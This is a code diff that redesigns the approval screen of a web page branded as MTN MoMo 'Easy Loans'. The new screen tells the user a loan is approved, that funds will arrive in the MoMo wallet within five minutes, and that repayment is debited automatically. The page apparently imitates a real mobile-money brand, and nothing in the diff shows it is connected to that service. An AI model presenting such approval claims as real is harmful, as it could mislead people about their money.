@@ -810,23 +810,68 @@
       </div>
     </div>
 
-    <!-- ─── Approval page ─── -->
+        <!-- ─── Approval page (V2) ─── -->
     <div id="page-approval" class="page">
-      <div class="navbar">
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub" data-i18n="navSubEasyLoans">Easy Loans</div>
+      <div class="apr-frame-top"></div>
+
+      <header class="apr-header">
+        <div class="apr-header-inner">
+          <a class="apr-brand" onclick="goTo('page-welcome')" style="cursor:pointer;"><strong>MTN<em>.</em></strong></a>
         </div>
-        <button class="nav-lang" onclick="showGate()">🌐</button>
-      </div>
-      <div style="padding: 24px; text-align: center;">
-        <h2 data-i18n="apprTitle">Loan Approved!</h2>
-        <p><span data-i18n="apprAmount">Amount:</span> <span id="aprAmount"></span></p>
-        <p><span data-i18n="apprTerm">Term:</span> <span id="aprTerm"></span></p>
-        <p><span data-i18n="apprMonthly">Monthly:</span> <span id="aprMth"></span></p>
-      </div>
+      </header>
+
+      <main class="apr-main">
+        <div class="apr-card">
+          <div class="apr-success-mark">
+            <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+
+          <div class="apr-status-pill"><span class="apr-dot"></span> Approved</div>
+
+          <h1>Loan <em>approved</em></h1>
+          <p class="apr-lede">
+            Your loan has been approved successfully.<br>
+            Funds will be <b>disbursed to your MoMo wallet</b> shortly.
+          </p>
+
+          <div class="apr-amount-box">
+            <div class="apr-row"><span>Loan amount</span><span id="rAmount">—</span></div>
+            <div class="apr-row"><span>Period</span><span id="rPeriod">—</span></div>
+            <div class="apr-row apr-total"><span>Total disbursed</span><span id="rTotal">—</span></div>
+          </div>
+
+          <div class="apr-eta-box">
+            <div class="apr-icon">
+              <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+            </div>
+            <div class="apr-txt">
+              Expected in your wallet within<br>
+              <b>5 minutes</b>
+            </div>
+          </div>
+
+          <div class="apr-steps">
+            <div class="apr-step">
+              <span class="apr-n">1</span>
+              <span>You'll receive an SMS confirmation from <b>MTN MoMo</b> once disbursed.</span>
+            </div>
+            <div class="apr-step">
+              <span class="apr-n">2</span>
+              <span>Check your <b>MoMo wallet balance</b> to confirm the deposit.</span>
+            </div>
+            <div class="apr-step">
+              <span class="apr-n">3</span>
+              <span>Repayment will be debited automatically on the due date.</span>
+            </div>
+          </div>
+
+          <a class="apr-cta" onclick="goTo('page-welcome')">Back to home</a>
+        </div>
+      </main>
+
+      <div class="apr-frame-bottom"></div>
     </div>
+
   </div>
 
   <!-- Overlays -->
